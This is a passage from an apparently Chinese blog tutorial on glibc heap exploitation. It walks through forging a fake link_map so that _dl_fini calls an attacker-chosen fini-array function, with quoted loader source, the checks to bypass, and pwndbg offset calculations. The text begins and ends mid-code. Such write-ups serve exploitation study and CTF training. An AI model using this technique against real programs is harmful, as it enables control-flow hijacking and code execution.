l-&amp;gt;l_real)						&lt;span class=&#34;comment&#34;&gt;//检查节点的地址是否跟自己结构体保存的一致&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		assert (i &amp;lt; nloaded);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		maps[i] = l;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		l-&amp;gt;l_idx = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		++i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;/* Bump l_direct_opencount of all objects so that they&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;		   are not dlclose()ed from underneath us.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		++l-&amp;gt;l_direct_opencount;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  assert (ns != LM_ID_BASE || i == nloaded);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; nmaps = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			 &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  __rtld_lock_unlock_recursive (GL(dl_load_lock));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; nmaps; ++i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;link_map&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;l&lt;/span&gt; =&lt;/span&gt; maps[i];			&lt;span class=&#34;comment&#34;&gt;//l遍历link_map的链表&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (l-&amp;gt;l_init_called)					&lt;span class=&#34;comment&#34;&gt;//重要的检查点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		  l-&amp;gt;l_init_called = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;						&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		  &lt;span class=&#34;comment&#34;&gt;/* Is there a destructor function?  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (l-&amp;gt;l_info[DT_FINI_ARRAY] != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		      || (ELF_INITFINI &amp;amp;&amp;amp; l-&amp;gt;l_info[DT_FINI] != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		      &lt;span class=&#34;comment&#34;&gt;/* When debugging print a message first.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__builtin_expect (GLRO(dl_debug_mask)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					    &amp;amp; DL_DEBUG_IMPCALLS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			_dl_debug_printf (&lt;span class=&#34;string&#34;&gt;&amp;quot;\ncalling fini: %s [%lu]\n\n&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					  DSO_FILENAME (l-&amp;gt;l_name),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					  ns);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		      &lt;span class=&#34;comment&#34;&gt;/* First see whether an array is given.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (l-&amp;gt;l_info[DT_FINI_ARRAY] != &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			  ElfW(Addr) *&lt;span class=&#34;built_in&#34;&gt;array&lt;/span&gt; =&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			    (ElfW(Addr) *) (l-&amp;gt;l_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					    + l-&amp;gt;l_info[DT_FINI_ARRAY]-&amp;gt;d_un.d_ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = (l-&amp;gt;l_info[DT_FINI_ARRAYSZ]-&amp;gt;d_un.d_val&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					    / &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; (ElfW(Addr)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (i-- &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			    ((&lt;span class=&#34;type&#34;&gt;fini_t&lt;/span&gt;) &lt;span class=&#34;built_in&#34;&gt;array&lt;/span&gt;[i]) ();					&lt;span class=&#34;comment&#34;&gt;//目标位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;总结下我们需要绕过那些检查&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;判断 &lt;code&gt;_ns_loaded&lt;/code&gt;  链表中至少有三个节点（dl-fini 开始部分通过循环遍历链表，做检查，）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查 &lt;code&gt;l == l-&amp;gt;l_real&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查 &lt;code&gt;l-&amp;gt;l_init_called &amp;gt; 8&lt;/code&gt;            这个其实跟数据的处理有关&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l_relocated:&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;	&lt;span class=&#34;comment&#34;&gt;/* Nonzero if object&amp;#x27;s relocations done.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l_init_called:&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;/* Nonzero if DT_INIT function called.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l_global:&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;	&lt;span class=&#34;comment&#34;&gt;/* Nonzero if object in _dl_global_scope.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l_reserved:&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;	&lt;span class=&#34;comment&#34;&gt;/* Reserved for internal use.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l_phdr_allocated:&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;/* Nonzero if the data structure pointed&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;					to by `l_phdr&amp;#x27; is allocated.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l_soname_added:&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;/* Nonzero if the SONAME is for sure in&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在 lunk_map 结构体中，这个变量是 4 字节，与结构体开始位置的偏移量为 0x31c。pwndbg 帮我们解释了数据的结果，这里的数据要大于 8，我们不妨之际设置为 9. 不同节点可以有所差异，下面是一个结果为 1 的数据&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/dreamkecat/blog_img//blog_img/image-20220922124850825.png&#34; alt=&#34;image-20220922124850825&#34;&gt;&lt;/p&gt;
&lt;p&gt;以及一个不为 1 的数据&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p *(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; link_map *)&lt;span class=&#34;number&#34;&gt;0x7f56e43ba7d0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt; = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_addr = &lt;span class=&#34;number&#34;&gt;140725148598272&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_name = &lt;span class=&#34;number&#34;&gt;0x7ffd207e4371&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;linux-vdso.so.1&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_ld = &lt;span class=&#34;number&#34;&gt;0x7ffd207e43e0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_next = &lt;span class=&#34;number&#34;&gt;0x7f56e4382000&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_prev = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba220&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_real = &lt;span class=&#34;number&#34;&gt;0x7f56e43ba7d0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_relocated = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_init_called = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  l_global = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/wx &lt;span class=&#34;number&#34;&gt;0x7f56e43ba7d0&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;0x31c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43baaec&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00000005&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查 &lt;code&gt;l-&amp;gt;l_info[DT_FINI_ARRAY] != NULL&lt;/code&gt; ，unsigned int i = (l-&amp;gt;l_info[DT_FINI_ARRAYSZ]-&amp;gt;d_un.d_val&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;​	DT_FINI_ARRAY 宏定义为 26，DT_FINI_ARRAYSZ 宏定义为 28，所以 l_info [26], 以及 l_info [28] 不能是 null (28 是因为 i 会影响到函数 ((fini_t) array [i]) (); 调用)&lt;/p&gt;
&lt;p&gt;下面我们具体说说如何伪造，我选择利用修改第三节点的 l_next 指针，指向一个 chunk, 并在 chunk 上部署我们伪造的 link_map. 这里依赖任意地址写，可通过 largebin attack 实现，或者其他漏洞造成的可以任意地址写堆地址。第三节点的指针在哪？_rtld_global 符号并不在 libc 文件，而是在 ld.so 文件中，我们要泄露出程序的 ld 基址，pwndbg 为我们提供了一个函数求偏移量&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; distance &amp;amp;_rtld_global &amp;amp;(_rtld_global._dl_ns._ns_loaded-&amp;gt;l_next-&amp;gt;l_next-&amp;gt;l_next)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43b9040&lt;/span&gt;-&amp;gt;&lt;span class=&#34;number&#34;&gt;0x7f56e4382018&lt;/span&gt; is &lt;span class=&#34;number&#34;&gt;-0x37028&lt;/span&gt; bytes (&lt;span class=&#34;number&#34;&gt;-0x6e05&lt;/span&gt; words)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由此我们就知道了需要向哪里写入 chunk.&lt;/p&gt;
&lt;p&gt;接下来就是重点，我们如何伪造 link_map.&lt;/p&gt;
&lt;p&gt;因为原来的链表中只有 4 个节点，而我们伪造的 link_map 有恰是第四个，所以，l_next 就是 0，l_prve 无所谓，直接写 0 即可。l_real 就是我们的伪造的 link_map 的开始地址，也是我们修改后的第三节点的 l_next 的值。这几个值离 link_map 的首地址很近，可以很直接的看出偏移量。接下来就是 l_info 的伪造。l_info [26] 不为 0，这是结构体内的数组，distance 可以得到 info [26] info [28] 关于节点地址的偏移量，同样我们可以得到上面提到的 l_init_called 的偏移量&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; distance _rtld_global._dl_ns._ns_loaded &amp;amp;_rtld_global._dl_ns._ns_loaded-&amp;gt;l_info[&lt;span class=&#34;number&#34;&gt;26&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43ba220&lt;/span&gt;-&amp;gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43ba330&lt;/span&gt; is &lt;span class=&#34;number&#34;&gt;0x110&lt;/span&gt; bytes (&lt;span class=&#34;number&#34;&gt;0x22&lt;/span&gt; words)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; distance _rtld_global._dl_ns._ns_loaded &amp;amp;_rtld_global._dl_ns._ns_loaded-&amp;gt;l_info[&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43ba220&lt;/span&gt;-&amp;gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43ba340&lt;/span&gt; is &lt;span class=&#34;number&#34;&gt;0x120&lt;/span&gt; bytes (&lt;span class=&#34;number&#34;&gt;0x24&lt;/span&gt; words)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; distance _rtld_global._dl_ns._ns_loaded &amp;amp;_rtld_global._dl_ns._ns_loaded-&amp;gt;l_init_called&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43ba220&lt;/span&gt;-&amp;gt;&lt;span class=&#34;number&#34;&gt;0x7f56e43ba53c&lt;/span&gt; is &lt;span class=&#34;number&#34;&gt;0x31c&lt;/span&gt; bytes (&lt;span class=&#34;number&#34;&gt;0x63&lt;/span&gt; words)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;重点来了，info 这连个位置我们写入什么数据&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  l_info = &amp;#123;&lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a656f072f8&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x7f56e4244cec&lt;/span&gt; &amp;lt;__execvpe+&lt;span class=&#34;number&#34;&gt;652&lt;/span&gt;&amp;gt;, &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a656f072e0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x55a656f072e8&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x9&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, 